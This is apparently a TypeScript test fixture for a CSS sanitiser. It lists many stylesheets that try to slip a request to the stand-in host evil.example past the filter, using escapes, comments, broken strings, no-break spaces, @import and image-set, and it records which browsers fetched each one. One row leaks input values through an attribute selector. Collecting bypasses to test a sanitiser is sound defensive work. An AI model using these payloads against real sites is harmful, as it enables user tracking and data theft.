// Stylesheets that try to get an address past the sanitiser.
//
// The third field records what browsers did with the row as written: which of
// headless Chromium 159 and Firefox 160 asked for anything beyond the page
// itself. Each row was put into a <style> element on a page with elements for
// its selectors, with every request recorded and answered locally, twice per
// browser with the same result. A row marked "inert" also holds nothing the
// test tokeniser reports as written.
export type FetchedBy = "both" | "chromium" | "firefox" | "none";
export type BypassAttempt = [
  name: string,
  css: string,
  fetchedBy: FetchedBy,
  inert?: "inert",
];

export const BYPASS_ATTEMPTS: BypassAttempt[] = [
  [
    "a url( spelled inside one string and closed inside a later one",
    `x{content:'url("data:'} input[value^="a"]{background:url(https://evil.example/a)} z{content:'")'}`,
    "both",
  ],
  [
    "a quoted url() cut short by a newline",
    'a{background:url("data:a\n) } .x{background:url(https://evil.example/b)} .y{content:")"}',
    "both",
  ],
  [
    "a url( spelled inside a comment",
    '/* url("data: */ .a{background:url(https://evil.example/c)} /* ") */',
    "both",
  ],
  [
    "an escaped quote inside a string",
    '.a{content:"\\"";background:url(https://evil.example/d)}',
    "both",
  ],
  [
    "a string continued over a line break",
    '.a{content:"x\\\n";background:url(https://evil.example/e)}',
    "both",
  ],
  [
    "the other quote character inside a string",
    `.a{content:"'";background:url('https://evil.example/f')}`,
    "both",
  ],
  [
    "a comment opener inside a string",
    '.a{content:"/*";background:url(https://evil.example/g)} .b{content:"*/"}',
    "both",
  ],
  [
    "a data: url() followed by a remote one",
    ".a{background:url( 'data:image/png;base64,AA==' ), url(  'https://evil.example/h'  )}",
    "both",
  ],
  ["upper case", ".a{background:URL(https://evil.example/i)}", "both"],
  [
    "an escaped upper-case letter",
    ".a{background:\\55RL(https://evil.example/j)}",
    "both",
  ],
  [
    "escapes inside the address",
    ".a{background:url(\\68ttps://evil.example/k)}",
    "both",
  ],
  [
    "a data: prefix that is only an argument of a quoted url()",
    '.a{background:url("https://evil.example/l" "data:x")}',
    "none",
  ],
  [
    "an escaped closing parenthesis",
    ".a{background:url(data:x\\);background:url(https://evil.example/m)}",
    "none",
    "inert",
  ],
  ["@import without a space", '@import"https://evil.example/n.css";', "both"],
  [
    "@import in upper case",
    "@IMPORT url(https://evil.example/o.css) screen;",
    "both",
  ],
  [
    "@import with an escaped letter",
    "@im\\port 'https://evil.example/p.css';",
    "both",
  ],
  [
    "@import with a semicolon inside its string",
    "@import 'https://evil.example/q.css?a;b' screen; .a{color:red}",
    "both",
  ],
  ["@import that never ends", "@import 'https://evil.example/r.css'", "both"],
  [
    "image-set with an escaped letter",
    '.a{background:image-\\73 et("https://evil.example/s" 1x)}',
    "both",
  ],
  [
    "a prefixed image-set after a comment",
    '.a{background:/**/-webkit-image-set("https://evil.example/t" 1x)}',
    "both",
  ],
  [
    "a malformed url( after <!-- that opens a string",
    '.z{x:<!--url(a" b)} .a{background:url(https://evil.example/u)} .b{content:"}',
    "both",
  ],
  [
    "the same with a single quote",
    ".z{x:<!--url(a' b)} .a{background:url(https://evil.example/v)} .b{content:'}",
    "both",
  ],
  [
    "a malformed url( after <!-- that opens a comment",
    ".z{x:<!--url(/*)} .a{background:url(https://evil.example/w)} /**/",
    "both",
  ],
  [
    "an escaped url( after <!--",
    '.z{x:<!--\\75rl(a"b)} .a{background:url(https://evil.example/x)} .b{content:"}',
    "both",
  ],
  [
    "a malformed url( after <!-- outside any rule",
    '<!--url(a" b){} .a{background:url(https://evil.example/y)} .b{content:"}',
    "both",
  ],
  [
    "an image-set behind a malformed url( after <!--",
    '.z{x:<!--url(a"b)} .a{background:image-set("https://evil.example/z" 1x)} .b{content:"}',
    "both",
  ],
  [
    "a malformed url( after -->",
    '.z{x:-->url(a" b)} .a{background:url(https://evil.example/aa)} .b{content:"}',
    "both",
  ],
  [
    "a comment opener in the brackets after a number with the unit url",
    '.z{x:1url(data:/*) " */ )} .a{background:url(https://evil.example/ab)} .b{content:" "}',
    "both",
  ],
  [
    "the same after a decimal fraction",
    '.z{x:.5url(data:/*) " */ )} .a{background:url(https://evil.example/ac)} .b{content:" "}',
    "both",
  ],
  [
    "the same after a number with an exponent",
    '.z{x:1e3url(data:/*) " */ )} .a{background:url(https://evil.example/ad)} .b{content:" "}',
    "both",
  ],
  [
    "the same after a hash named url",
    '.z{x:#url(data:/*) " */ )} .a{background:url(https://evil.example/ae)} .b{content:" "}',
    "both",
  ],
  [
    "a no-break space before url(",
    ".a{background:\u00a0url(https://evil.example/af)}",
    "none",
  ],
  [
    "a malformed url( after a no-break space",
    '.z{x:\u00a0url(a" b)} .a{background:url(https://evil.example/ag)} .b{content:"}',
    "none",
  ],
  [
    "a quoted data: url( whose name starts with a line separator",
    '.z{x:\u2028url("data:x" url(https://evil.example/ah))}',
    "none",
  ],
  [
    "a no-break space before image-set",
    '.a{background:\u00a0image-set("https://evil.example/ai" 1x)}',
    "none",
  ],
  [
    "a no-break space after @import",
    '@import\u00a0"https://evil.example/aj.css";',
    "none",
  ],
  [
    "a malformed url( after a unicode range",
    '.z{x:u+aaaaaaurl(a" b)} .a{background:url(https://evil.example/ak)} .b{content:"}',
    "none",
  ],
  // text we take out must never let its two neighbours join
  [
    "an @import between two halves of url, after a hex escape",
    ".a{background:u\\72@import x;l(https://evil.example/ba)}",
    "none",
  ],
  [
    "an @import right after an escaped first letter",
    ".a{background:\\75@import x;rl(https://evil.example/bb)}",
    "none",
  ],
  [
    "an @import between an escaped last letter and the bracket",
    ".a{background:ur\\6c@import x;(https://evil.example/bc)}",
    "none",
  ],
  [
    "an @import with a block between two halves of url",
    ".a{background:u\\72@import{}l(https://evil.example/bd)}",
    "none",
  ],
  [
    "an upper-case @import with an address between two halves of url",
    ".a{background:u\\72@IMPORT url(x);l(https://evil.example/be)}",
    "none",
  ],
  [
    "an @import inside the word @import",
    '@im\\70@import x;ort "https://evil.example/bf.css";',
    "none",
  ],
  [
    "an @import inside the word image-set",
    '.a{background:image-\\73@import x;et("https://evil.example/bg" 1x)}',
    "none",
  ],
  [
    "an @import after the first letters of image-set",
    '.a{background:i\\6d@import x;age-set("https://evil.example/bh" 1x)}',
    "none",
  ],
  [
    "an @import inside the word src",
    '.a{background:s\\72@import x;c("https://evil.example/bi")}',
    "none",
  ],
  [
    "an @import between @ and import",
    '@@import x;import "https://evil.example/bj.css";',
    "none",
  ],
  [
    "a refused address between two halves of image-set",
    '.a{background:image-url(x)set("https://evil.example/bk" 1x)}',
    "none",
    "inert",
  ],
  // comments
  [
    "comments around the rule",
    "/**/.a{background:url(https://evil.example/ca)}/**/",
    "both",
  ],
  [
    "a comment mark inside the address",
    ".a{background:url(/**/https://evil.example/cb)}",
    "both",
  ],
  [
    "a comment left open after the rule",
    ".a{background:url(https://evil.example/cc)} /* open",
    "both",
  ],
  [
    "a comment left open right after the address",
    ".a{background:url(https://evil.example/cd)/*",
    "both",
  ],
  [
    "a comment between url and its bracket",
    ".a{background:url/**/(https://evil.example/ce)}",
    "none",
    "inert",
  ],
  [
    "a comment that ends in a string",
    '/* " */ .a{background:url(https://evil.example/cf)} /* " */',
    "both",
  ],
  // constructs the stylesheet leaves open
  [
    "an unquoted address left open",
    ".a{background:url(https://evil.example/da",
    "both",
  ],
  [
    "a quoted address without its bracket",
    '.a{background:url("https://evil.example/db"',
    "both",
  ],
  [
    "a quoted address left open",
    ".a{background:url('https://evil.example/dc",
    "both",
  ],
  [
    "an image-set left open",
    '.a{background:image-set("https://evil.example/dd" 1x',
    "both",
  ],
  [
    "an @import string left open",
    '@import "https://evil.example/de.css',
    "both",
  ],
  [
    "an @import address left open",
    "@import url(https://evil.example/df.css",
    "both",
  ],
  [
    "an address left open after white space",
    ".a{background:url(https://evil.example/dg   ",
    "both",
  ],
  // how the browser recovers from a broken string or address
  [
    "a string broken by a line break",
    '.z{content:"abc\n} .a{background:url(https://evil.example/ea)}',
    "both",
  ],
  [
    "an address with a space in it",
    ".z{x:url(a b)} .a{background:url(https://evil.example/eb)}",
    "both",
  ],
  [
    "an address with a bracket in it",
    ".z{x:url(a(b)} .a{background:url(https://evil.example/ec)}",
    "both",
  ],
  [
    "an address with a backslash before a line break",
    ".z{x:url(a\\\n)} .a{background:url(https://evil.example/ed)}",
    "both",
  ],
  [
    "a broken address that runs over an escaped bracket into a quote",
    '.z{x:url(a b\\)" )} .a{background:url(https://evil.example/ee)} .b{content:"}',
    "both",
  ],
  [
    "an address with a control character",
    ".z{x:url(data:x\u0001)} .a{background:url(https://evil.example/ef)}",
    "both",
  ],
  [
    "a broken address that holds a comment opener",
    ".z{x:url(a b /*)} .a{background:url(https://evil.example/eg)} /**/",
    "both",
  ],
  [
    "a string ended by a line break after a hex escape",
    '.z{content:"\\41\n"} .a{background:url(https://evil.example/eh)} .b{content:"}',
    "both",
  ],
  // spellings of the address itself
  [
    "white space around an unquoted address",
    ".a{background:url(  https://evil.example/fa  )}",
    "both",
  ],
  [
    "line breaks around a quoted address",
    '.a{background:url(\n"https://evil.example/fb"\n)}',
    "both",
  ],
  [
    "an address without a scheme",
    ".a{background:url(//evil.example/fc)}",
    "both",
  ],
  [
    "an address with escaped slashes",
    ".a{background:url(\\2f\\2f evil.example/fd)}",
    "both",
  ],
  [
    "a blob address after an upper-case data address",
    ".a{background:url(DATA:image/png;base64,AA==),url(blob:https://evil.example/fe)}",
    "chromium",
  ],
  [
    "a quoted address that starts with an escaped tab",
    '.a{background:url("\\9 https://evil.example/ff")}',
    "both",
  ],
  [
    "an address with an escaped letter in its scheme",
    ".a{background:url(data\\3a x),url(ht\\74ps://evil.example/fg)}",
    "both",
  ],
  [
    "a quoted address after leading spaces",
    '.a{background:url(" data:,x"),url("  https://evil.example/fh")}',
    "both",
  ],
  [
    "an address that only mentions data: later",
    ".a{background:url(https://evil.example/fi?data:image/png)}",
    "both",
  ],
  [
    "an address in a custom property",
    ".a{--x:url(https://evil.example/fj);background:var(--x)}",
    "both",
  ],
  [
    "a string in a custom property read by image-set",
    '.a{--x:"https://evil.example/fk";background:image-set(var(--x) 1x)}',
    "both",
  ],
  // every function that takes an address
  ["src()", '.a{background:src("https://evil.example/ga")}', "none"],
  ["image()", '.a{background:image("https://evil.example/gb")}', "none"],
  [
    "image-set with an address and a type",
    ".a{background:image-set(url(https://evil.example/gc) 1x type('image/png'))}",
    "both",
  ],
  [
    "an upper-case image-set",
    '.a{background:IMAGE-SET("https://evil.example/gd" 1x)}',
    "both",
  ],
  [
    "another vendor's image-set",
    '.a{background:-moz-image-set("https://evil.example/ge" 1x)}',
    "none",
  ],
  [
    "cross-fade",
    ".a{background:cross-fade(url(https://evil.example/gf),url(data:image/png;base64,AA==))}",
    "none",
  ],
  [
    "a prefixed cross-fade",
    ".a{background:-webkit-cross-fade(url(https://evil.example/gg),url(data:image/png;base64,AA==),50%)}",
    "chromium",
  ],
  [
    "an address passed to a custom function",
    ".a{background:--theme-image(url(https://evil.example/gh))}",
    "none",
  ],
  [
    "an address returned by a custom function",
    "@function --theme-src(){result:url(https://evil.example/gi)} .a{background:--theme-src()}",
    "chromium",
  ],
  [
    "an image-set passed to a custom function",
    '.a{background:--theme-url(image-set("https://evil.example/gj" 1x))}',
    "none",
  ],
  // every place that takes an address
  ["a cursor", ".a{cursor:url(https://evil.example/ha.cur),auto}", "both"],
  [
    "a list marker",
    '.a{display:list-item;list-style:url("https://evil.example/hb")}',
    "both",
  ],
  ["a mask", ".a{mask:url(https://evil.example/hc.svg)}", "both"],
  [
    "a prefixed mask image",
    ".a{-webkit-mask-image:url(https://evil.example/hd.svg)}",
    "both",
  ],
  [
    "a border image",
    ".a{border:9px solid;border-image:url(https://evil.example/he) 9}",
    "both",
  ],
  [
    "generated content",
    ".a::before{content:url(https://evil.example/hf)}",
    "both",
  ],
  [
    "a font",
    "@font-face{font-family:f;src:url(https://evil.example/hg.woff2)} .a{font-family:f}",
    "both",
  ],
  [
    "a font after a local one",
    '@font-face{font-family:f;src:local(x),url("https://evil.example/hh.woff") format("woff")} .a{font-family:f}',
    "both",
  ],
  [
    "a namespace with a prefix",
    "@namespace svg url(https://evil.example/hi); .a{color:red}",
    "none",
  ],
  ["a default namespace", '@namespace url("https://evil.example/hj");', "none"],
  [
    "a shape",
    ".a{float:left;shape-outside:url(https://evil.example/hk)}",
    "both",
  ],
  ["a filter", ".a{filter:url(https://evil.example/hl#f)}", "chromium"],
  [
    "a counter symbol",
    "@counter-style c{system:cyclic;symbols:url(https://evil.example/hm);suffix:' '} .a{display:list-item;list-style:c}",
    "none",
  ],
  [
    "an @import inside another rule",
    '@media screen{@import "https://evil.example/hn.css";}',
    "none",
  ],
  [
    "an @import with a layer and a condition",
    "@import url(https://evil.example/ho.css) layer(x) supports(display:grid) screen;",
    "both",
  ],
  [
    "an address inside nested rules",
    "@supports (display:grid){@layer t{.a{background:url(https://evil.example/hp)}}}",
    "both",
  ],
  // tokens that engines split in different places
  [
    "a malformed url( after a number and a no-break space",
    '.z{x:1\u00a0url(a" b)} .a{background:url(https://evil.example/ia)} .b{content:"}',
    "none",
  ],
  [
    "a malformed url( after a hash and a no-break space",
    '.z{x:#h\u00a0url(a" b)} .a{background:url(https://evil.example/ib)} .b{content:"}',
    "none",
  ],
  [
    "a malformed url( after an at-word and a no-break space",
    '.z{x:@k\u00a0url(a" b)} .a{background:url(https://evil.example/ic)} .b{content:"}',
    "none",
  ],
  [
    "a malformed url( after a unicode range of digits",
    '.z{x:u+123456url(a" b)} .a{background:url(https://evil.example/id)} .b{content:"}',
    "none",
  ],
  [
    "a malformed url( after a unicode range with two ends",
    '.z{x:u+0-1url(a" b)} .a{background:url(https://evil.example/ie)} .b{content:"}',
    "none",
  ],
  [
    "a malformed url( after a unicode range with a wildcard",
    '.z{x:U+1?url(a" b)} .a{background:url(https://evil.example/if)} .b{content:"}',
    "both",
  ],
  [
    "a malformed escaped url( after a unicode range",
    '.z{x:u+a\\75rl(a" b)} .a{background:url(https://evil.example/ig)} .b{content:"}',
    "none",
  ],
  [
    "a malformed url( after a no-break space and a unicode range",
    '.z{x:\u00a0u+12url(a" b)} .a{background:url(https://evil.example/ih)} .b{content:"}',
    "none",
  ],
  [
    "an image-set after a name and a no-break space",
    '.a{background:x\u00a0image-set("https://evil.example/ii" 1x)}',
    "none",
  ],
  [
    "a malformed url( after a zero-width space inside a name",
    '.z{x:a\u200burl(a" b)} .a{background:url(https://evil.example/ij)} .b{content:"}',
    "none",
  ],
  [
    "a prefixed image-set after a unicode range",
    '.a{background:u+e-webkit-image-set("https://evil.example/ik" 1x)}',
    "none",
  ],
  [
    "a malformed url( after the closing tag of a style element",
    '.z{x:</styleurl(a" b)} .a{background:url(https://evil.example/il)} .b{content:"}',
    "none",
    "inert",
  ],
  // strings and stand-ins for strings inside a list of images
  [
    "a string beside an inline image in image-set",
    '.a{background:image-set(url(data:image/png;base64,AA==) 1x,"https://evil.example/ja" 2x)}',
    "none",
  ],
  [
    "a string beside a gradient in image-set",
    '.a{background:image-set(linear-gradient(red,blue) 1x,"https://evil.example/jb" 2x)}',
    "none",
  ],
  [
    "a string in brackets inside image-set",
    '.a{background:image-set(("https://evil.example/jc") 1x)}',
    "none",
  ],
  [
    "a string after a type in image-set",
    '.a{background:image-set(type("image/png") "https://evil.example/jd" 1x)}',
    "none",
  ],
  [
    "a custom function that returns a string to image-set",
    '@function --f(){result:"https://evil.example/je"} .a{background:image-set(--f() 1x)}',
    "chromium",
  ],
  [
    "an image-set inside an image-set",
    '.a{background:image-set(image-set("https://evil.example/jf" 1x) 1x)}',
    "none",
  ],
  [
    "a fallback string of env() in image-set",
    '.a{background:image-set(env(x,"https://evil.example/jg") 1x)}',
    "both",
  ],
  [
    "a string and a colour in image()",
    '.a{background:image("https://evil.example/jh",red)}',
    "none",
  ],
  [
    "a string in calc() in image-set",
    '.a{background:image-set(calc("https://evil.example/ji") 1x)}',
    "none",
  ],
  [
    "a string left open in image-set",
    '.a{background:image-set("https://evil.example/jj',
    "both",
  ],
  [
    "an attribute read by a prefixed image-set",
    ".a{background:-webkit-image-set(attr(title) 1x)}",
    "none",
  ],
  [
    "a fallback string of var() in image-set",
    '.a{background:image-set(var(--none,"https://evil.example/jk") 1x)}',
    "both",
  ],
  [
    "a string behind a gradient left open in image-set",
    '.a{background:image-set(linear-gradient(red,blue 1x,"https://evil.example/jl" 2x)}',
    "none",
    "inert",
  ],
  [
    "a string broken by a line break in image-set",
    '.a{background:image-set("https://evil.example/jm\n" 1x)}',
    "none",
  ],
  // a namespace rule keeps its address as a name, and nothing else rides along
  [
    "an address after a namespace rule",
    ".x{} @namespace svg url(http://www.w3.org/2000/svg); .a{background:url(https://evil.example/ka)}",
    "both",
  ],
  [
    "a second address in a namespace rule",
    "@namespace svg url(http://www.w3.org/2000/svg) url(https://evil.example/kb);",
    "none",
  ],
  [
    "a namespace rule that runs into a block",
    "@namespace svg url(http://www.w3.org/2000/svg) .a{background:url(https://evil.example/kc)}",
    "none",
  ],
  [
    "an image-set in a namespace rule",
    '@namespace svg image-set(url(https://evil.example/kd) 1x "https://evil.example/ke" 2x);',
    "none",
  ],
  [
    "a namespace rule inside a declaration block",
    ".a{@namespace x url(https://evil.example/kf);background:url(https://evil.example/kg)}",
    "both",
  ],
  [
    "a namespace rule inside image-set",
    ".a{background:image-set(@namespace url(https://evil.example/kh) 1x)}",
    "none",
  ],
  [
    "a namespace address with an escape that ends in a quote",
    '@namespace svg url(a\\22); .a{background:url(https://evil.example/ki)} .b{content:"}',
    "both",
  ],
  [
    "a namespace address left open",
    "@namespace svg url(https://evil.example/kj",
    "none",
  ],
  [
    "a quoted namespace address with a second argument",
    '@namespace svg url("https://evil.example/kk" url(https://evil.example/kl));',
    "none",
  ],
  [
    "a namespace address followed by an @import",
    '@namespace svg url(x)@import "https://evil.example/km.css";',
    "none",
  ],
  // the fine print of escapes
  [
    "a tab after a hex escape",
    ".a{background:\\75\trl(https://evil.example/la)}",
    "both",
  ],
  [
    "an upper-case hex escape",
    ".a{background:ur\\6C(https://evil.example/lb)}",
    "both",
  ],
  [
    "a backslash and a line break before url(",
    ".a{background:\\\nurl(https://evil.example/lc)}",
    "none",
  ],
  [
    "a six-digit escape followed by a hex letter",
    ".a{background:\\000075rl(https://evil.example/ld)} .b{background:u\\000072l(https://evil.example/le)}",
    "both",
  ],
  // a function in an image list that only some engines read as one
  [
    "a type() after a unicode range that holds var() in image-set",
    '*{--x:"https://evil.example/ma";background-image:image-set(u+1type(var(--x)) 1x)}',
    "none",
  ],
  [
    "a type() after a unicode range that holds a string in image-set",
    '*{background-image:image-set(u+1type("https://evil.example/mb") 1x)}',
    "none",
  ],
  [
    "a var() after an at-word and a no-break space in image-set",
    '*{--x:"https://evil.example/mc";background-image:image-set(@foo\u00a0var(--x) 1x)}',
    "none",
  ],
  [
    "a var() after a number and a no-break space in image-set",
    '*{--x:"https://evil.example/md";background-image:image-set(1\u00a0var(--x) 1x)}',
    "none",
  ],
  [
    "an env() after a hash and a no-break space in image-set",
    '*{--x:"https://evil.example/me";background-image:image-set(#a\u00a0env(a,var(--x)) 1x)}',
    "none",
  ],
  [
    "an env() after a unicode range in image-set",
    '*{background-image:image-set(u+1env(a,"https://evil.example/mf") 1x)}',
    "none",
  ],
  [
    "a var() after a no-break space and a unicode range in a prefixed image-set",
    '*{--x:"https://evil.example/mg";background-image:-webkit-image-set(\u00a0u+0-1var(--x) 1x)}',
    "none",
  ],
  // a backslash before the closing tag of a style element, which we escape ourselves
  [
    "an escaped closing tag after a number",
    ".a{width:1 \\</stylex(1)}",
    "none",
    "inert",
  ],
  [
    "an escaped closing tag after an at-word",
    ".a{color:red} @foo \\</style-x(1) .b{color:blue}",
    "none",
    "inert",
  ],
  [
    "an escaped upper-case closing tag after a hash",
    ".a{x:#a \\</STYLEvar(--y)}",
    "none",
    "inert",
  ],
  [
    "an escaped closing tag right after a number",
    ".a{x:.5\\</style calc(1)}",
    "none",
    "inert",
  ],
];
